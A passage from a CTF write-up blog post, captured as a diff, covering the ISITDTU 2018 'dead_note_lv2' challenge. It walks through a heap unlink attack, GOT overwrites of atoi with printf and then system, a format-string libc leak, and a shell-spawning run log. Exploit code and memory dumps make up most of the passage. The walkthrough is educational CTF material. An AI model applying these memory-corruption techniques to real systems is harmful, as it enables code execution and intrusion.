+<p>After the edit, the heap will look like this</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x603480: 0x0000000000000000  0x0000000000000091 &lt;= Note 8
+0x603490: 0x0000000000000000  0x0000000000000121 &lt;= Fake chunk
+0x6034a0: 0x0000000000602108  0x0000000000602110 &lt;= Fake FD/BK
+0x6034b0: 0x4141414141414141  0x4141414141414141
+0x6034c0: 0x4141414141414141  0x4141414141414141
+0x6034d0: 0x4141414141414141  0x4141414141414141
+0x6034e0: 0x4141414141414141  0x4141414141414141
+0x6034f0: 0x4141414141414141  0x4141414141414141
+0x603500: 0x0000000000000000  0x0000000000000000
+0x603510: 0x0000000000000080  0x0000000000000090 &lt;= Note 8 prev_size / Note 9
+0x603520: 0x4141414141414100  0x0000000000000000
+0x603530: 0x0000000000000000  0x0000000000000000
+0x603540: 0x0000000000000000  0x0000000000000000
+0x603550: 0x0000000000000000  0x0000000000000000
+0x603560: 0x0000000000000000  0x0000000000000000
+0x603570: 0x0000000000000000  0x0000000000000000
+0x603580: 0x0000000000000000  0x0000000000000000
+0x603590: 0x0000000000000000  0x0000000000000000
+0x6035a0: 0x0000000000000000  0x0000000000000091
+0x6035b0: 0x0000000000000120  0x0000000000000000 &lt;= Fake chunk prev_size</code></pre></figure>
+
+<p>We now have everything prepared for <code class="language-plaintext highlighter-rouge">unlink</code> doing its magic :)</p>
+
+<p>Deleting Note 9 will now letting <code class="language-plaintext highlighter-rouge">free</code> think the previous chunk is also free (<code class="language-plaintext highlighter-rouge">0x603510</code> - <code class="language-plaintext highlighter-rouge">0x80</code> =&gt; <code class="language-plaintext highlighter-rouge">0x603490</code> (Fake chunk)) and unlink it.</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x603480: 0x0000000000000000  0x0000000000000091 &lt;= Note 8
+0x603490: 0x0000000000000000  0x0000000000000111 \ Fake chunk
+0x6034a0: 0x0000000000603090  0x00007ffff7dd1b78 |
+0x6034b0: 0x4141414141414141  0x4141414141414141 |
+0x6034c0: 0x4141414141414141  0x4141414141414141 |
+0x6034d0: 0x4141414141414141  0x4141414141414141 |
+0x6034e0: 0x4141414141414141  0x4141414141414141 |
+0x6034f0: 0x4141414141414141  0x4141414141414141 |
+0x603500: 0x0000000000000000  0x0000000000000000 |
+0x603510: 0x0000000000000080  0x0000000000000090 | Note 9 (freed)
+0x603520: 0x4141414141414100  0x0000000000000000 |
+0x603530: 0x0000000000000000  0x0000000000000000 |
+0x603540: 0x0000000000000000  0x0000000000000000 |
+0x603550: 0x0000000000000000  0x0000000000000000 |
+0x603560: 0x0000000000000000  0x0000000000000000 |
+0x603570: 0x0000000000000000  0x0000000000000000 |
+0x603580: 0x0000000000000000  0x0000000000000000 |
+0x603590: 0x0000000000000000  0x0000000000000000 |
+0x6035a0: 0x0000000000000110  0x0000000000000090 / 
+0x6035b0: 0x0000000000000120  0x0000000000000000
+
+NOTE_TABLE
+
+0x6020e0: 0x0000000000603010  0x0000000000000000 &lt;= Note 0 / 1
+0x6020f0: 0x0000000000603130  0x00000000006031c0 &lt;= Note 2 / 3
+0x602100: 0x0000000000603250  0x00000000006032e0 &lt;= Note 4 / 5
+0x602110: 0x0000000000603370  0x0000000000603400 &lt;= Note 6 / 7
+0x602120: 0x0000000000602108  0x0000000000000000 &lt;= Note 8 / 9
+0x602130: 0x000000000060350f  0x0000000000000000 &lt;= Note 10</code></pre></figure>
+
+<p><em>EDIT (Adding a little bit more explanation on the unlink portion)</em></p>
+
+<p>When note 9 gets freed, <code class="language-plaintext highlighter-rouge">free</code> will think the previous chunk is also free, since we set the <code class="language-plaintext highlighter-rouge">prev_inuse</code> bit to <code class="language-plaintext highlighter-rouge">0x0</code>. So it will try to consolidate backwards and unlink the previous chunk from its binlist. <code class="language-plaintext highlighter-rouge">free</code> does this with the <code class="language-plaintext highlighter-rouge">unlink</code> macro</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">FD-&gt;bk = BK;
+BK-&gt;FD = FD;</code></pre></figure>
+
+<p>So, let’s check the state of FD/BK before unlink is triggered:</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/30gx 0x603490
+0x603490: 0x0000000000000000  0x0000000000000121 &lt;= Note 8
+0x6034a0: 0x0000000000602108  0x0000000000602110 &lt;= FD / BK
+0x6034b0: 0x4141414141414141  0x4141414141414141</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">unlink</code> will now execute <code class="language-plaintext highlighter-rouge">FD-&gt;bk = BK</code> with <code class="language-plaintext highlighter-rouge">FD = 0x602108</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10gx 0x602108
+0x602108: 0x00000000006032e0  0x0000000000603370
+0x602118: 0x0000000000603400  0x0000000000603490 &lt;= FD / BK (Note 8 pointer)</code></pre></figure>
+
+<p>It interprets <code class="language-plaintext highlighter-rouge">0x602108</code> as a chunk, and thus overwrites its <code class="language-plaintext highlighter-rouge">BK</code> (0x602120) with the <code class="language-plaintext highlighter-rouge">BK</code> from our fake chunk (<code class="language-plaintext highlighter-rouge">0x602110</code>), so it would look like this</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10gx 0x602108
+0x602108: 0x00000000006032e0  0x0000000000603370
+0x602118: 0x0000000000603400  0x0000000000602110 &lt;= FD / BK (Note 8 pointer)</code></pre></figure>
+
+<p>Now, <code class="language-plaintext highlighter-rouge">unlink</code> will execute <code class="language-plaintext highlighter-rouge">BK-&gt;fd = FD</code> with <code class="language-plaintext highlighter-rouge">BK = 0x602110</code> (from our fake chunk in the heap).</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10gx 0x602110
+0x602110: 0x0000000000603370  0x0000000000603400
+0x602120: 0x0000000000602110  0x0000000000603520 &lt;= FD (Note 8 pointer) / BK</code></pre></figure>
+
+<p>So, now <code class="language-plaintext highlighter-rouge">unlink</code> wants to set the <code class="language-plaintext highlighter-rouge">FD</code> value for this chunk, which also happens to be <code class="language-plaintext highlighter-rouge">0x602120</code>, thus overwriting it with the <code class="language-plaintext highlighter-rouge">FD</code> value from our fake chunk (<code class="language-plaintext highlighter-rouge">0x602108</code>), resulting in</p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">gdb-peda$ x/10gx 0x602110
+0x602110: 0x0000000000603370  0x0000000000603400
+0x602120: 0x0000000000602108  0x0000000000000000 &lt;= FD (Note 8 pointer) / BK</code></pre></figure>
+
+<p><em>/EDIT</em></p>
+
+<p><code class="language-plaintext highlighter-rouge">Note 8</code> now contains <code class="language-plaintext highlighter-rouge">0x602108</code> pointing back in our <code class="language-plaintext highlighter-rouge">NOTETABLE</code>, so we can now use <code class="language-plaintext highlighter-rouge">Note 8</code> to write arbitrary addresses into the <code class="language-plaintext highlighter-rouge">NOTETABLE</code> and then edit those addresses to overwrite arbitrary addresses.</p>
+
+<p>With this, it’s only a matter of overwriting <code class="language-plaintext highlighter-rouge">got</code> entries, leaking libc and call <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>, so let’s wrap this up</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite atoi with printf"</span><span class="p">)</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">got</span><span class="p">[</span><span class="s">"atoi"</span><span class="p">]))</span>
+
+<span class="n">edit</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">e</span><span class="p">.</span><span class="n">plt</span><span class="p">[</span><span class="s">"printf"</span><span class="p">]</span><span class="o">+</span><span class="mi">6</span><span class="p">))</span></code></pre></figure>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">0x602000: 0x0000000000601e28  0x00007ffff7ffe168
+0x602010: 0x00007ffff7dee870  0x00007ffff7a914f0
+0x602020: 0x00007ffff7a7c690  0x0000000000400736
+0x602030: 0x00007ffff7a836b0  0x00007ffff7a62800
+0x602040: 0x00007ffff7ad9200  0x00007ffff7b04250
+0x602050: 0x00007ffff7a2d740  0x00007ffff7a423c0
+0x602060: 0x00007ffff7a91130  0x0000000000400756 &lt;= . / atoi (now printf plt)
+0x602070: 0x0000000000400700  0x0000000000000000
+0x602080: 0x0000000000000000  0x0000000000000000
+0x602090: 0x0000000000000000  0x0000000000000000
+0x6020a0 &lt;stdout&gt;:  0x00007ffff7dd2620  0x0000000000000000
+0x6020b0 &lt;stdin&gt;: 0x00007ffff7dd18e0  0x0000000000000000
+0x6020c0 &lt;stderr&gt;:  0x00007ffff7dd2540  0x0000000000000000
+0x6020d0: 0x0000000000000000  0x0000000000000000
+0x6020e0: 0x0000000000603010  0x0000000000000000 &lt;= Note 0 / 1
+0x6020f0: 0x0000000000603130  0x00000000006031c0 &lt;= Note 2 / 3
+0x602100: 0x0000000000603250  0x0000000000602068 &lt;= Note 4 / 5 (points to atoi got)
+0x602110: 0x0000000000603300  0x0000000000603400
+0x602120: 0x0000000000602108  0x0000000000000000
+0x602130: 0x000000000060350f  0x0000000000000000</code></pre></figure>
+
+<p><code class="language-plaintext highlighter-rouge">atoi</code> is now <code class="language-plaintext highlighter-rouge">printf</code>, so any input in the menu will be executed by <code class="language-plaintext highlighter-rouge">printf</code> instead, so we can send some format strings as input to leak <code class="language-plaintext highlighter-rouge">libc</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Leak LIBC"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">"%3$p"</span><span class="p">)</span>
+
+<span class="n">leak</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">14</span><span class="p">),</span> <span class="mi">16</span><span class="p">)</span>
+<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0xf7260</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC leak        : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">leak</span><span class="p">))</span>
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"LIBC             : %s"</span> <span class="o">%</span> <span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">address</span><span class="p">))</span>
+<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">)</span></code></pre></figure>
+
+<p>Knowing <code class="language-plaintext highlighter-rouge">libc</code>, we can now overwrite <code class="language-plaintext highlighter-rouge">atoi</code> again, but this time with <code class="language-plaintext highlighter-rouge">system</code>.</p>
+
+<p>We just have to consider that for selecting a menu, <code class="language-plaintext highlighter-rouge">atoi</code> is no longer called, but <code class="language-plaintext highlighter-rouge">printf</code> (which returns the count of printed characters). So for selecting <code class="language-plaintext highlighter-rouge">edit_note</code> we have to send for example <code class="language-plaintext highlighter-rouge">..</code> instead of <code class="language-plaintext highlighter-rouge">2</code>.</p>
+
+<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Overwrite atoi with system"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">".."</span><span class="p">)</span>        <span class="c1"># edit
+</span><span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">": "</span><span class="p">,</span> <span class="s">"....."</span><span class="p">)</span>  <span class="c1"># index 5
+</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Content: "</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">"system"</span><span class="p">]))</span>
+
+<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Select '/bin/sh' to trigger shell"</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"Your choice: "</span><span class="p">,</span> <span class="s">"/bin/sh</span><span class="se">\x00</span><span class="s">"</span><span class="p">)</span>
+
+<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span></code></pre></figure>
+
+<p>Same game, having <code class="language-plaintext highlighter-rouge">atoi</code> now replaced with <code class="language-plaintext highlighter-rouge">system</code>, we just have to send another <code class="language-plaintext highlighter-rouge">/bin/sh</code> to trigger <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code></p>
+
+<figure class="highlight"><pre><code class="language-text" data-lang="text">[*] '/vagrant/Challenges/isit/pwn/deadnote2/dead_note_lv2/dead_note_lv2'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+[*] '/vagrant/Challenges/isit/pwn/deadnote2/dead_note_lv2/libc.so.6'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+[+] Opening connection to 206.189.46.173 on port 50200: Done
+[*] Create initial notes
+[*] Prepare fake chunk for unlink
+[*] Call delete to get note counter to -1
+[*] Create chunk to fill 1
+[*] Create chunk in NOTE_COUNT
+[*] Move NOTE_COUNT to prev_size of chunk 9
+[*] Overwrite prev_size and size
+[*] Paused (press any to continue)
+[*] Trigger unlink by freeing chunk 9 (chunk 8 points to bss now (=&gt;chunk 5))
+[*] Overwrite atoi with printf
+[*] Leak LIBC
+[*] LIBC leak        : 0x7fb6eedae260
+[*] LIBC             : 0x7fb6eecb7000
+[*] Overwrite atoi with system
+[*] Select '/bin/sh' to trigger shell
+[*] Switching to interactive mode
+$ cd /home/dead_note_lv2
+$ cat flag
+ISITDTU{838a545cbc2a33bd26f95ed1c708a1ab}</code></pre></figure>
+
+
+    <aside class="share">
+
+      <span>Share this: </span>
+
+      <a href="http://twitter.com/share?text=ISITDTU CTF 2018 Quals - dead_note_lv2&amp;url=https://kileak.github.io/ctf/2018/isitdtu-deadnote2/"
+      onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
+        <i class="icon icon-twitter-rounded"></i>
+      </a>
+
+      <a href="https://www.facebook.com/sharer/sharer.php?u=https://kileak.github.io/ctf/2018/isitdtu-deadnote2/"
+      onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
+        <i class="icon icon-facebook-rounded"></i>
+      </a>
+
+    </aside>
+  </div>
+
+  
+  <hr>
+  <aside id="comments" class="disqus">
+    <div class="container">
+      <h3><i class="icon icon-comments-o"></i> Comments</h3>
+      <div id="disqus_thread"></div>
+
+      <script type="text/javascript">
+        var disqus_shortname = 'kileak';
+        var disqus_identifier = '/ctf/2018/isitdtu-deadnote2';
+        var disqus_title = 'ISITDTU CTF 2018 Quals - dead_note_lv2';
+        var disqus_url = 'https://kileak.github.io/ctf/2018/isitdtu-deadnote2';
+
+        (function() {
+            var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+            dsq.src = '//' + disqus_shortname + '.disqus.com/embed.js';
+            (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+        })();
+      </script>
+
+      <noscript>
+        Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
+      </noscript>
+    </div>
+  </aside>
+
+
+
+</article>
+
+        </section>
+
+        
+<div class="clearfix"></div>
+
+<footer class="site-footer txt-center">
+  <hr>
+
+  <ul class="social">
+    
+  </ul>
+
+  <small>&copy; 2025 All rights reserved. Made with <a href="http://jekyllrb.com" target="_blank">Jekyll</a> and <i class="icon icon-heart"></i></small>
+  <small>by <a href="http://nandomoreira.me" target="_blank">nandomoreira.me</a></small>
+
+</footer>
+
+
+    </main>
+
+    <a href="http://github.com/Kileak" target="_blank" class="github-corner"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#000; color:#fff; position: absolute; top: 0; border: 0; right: 0;"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/jekyll-search.min.js"></script>
+    <script src="/js/main.js"></script>
+  </body>
+</html>
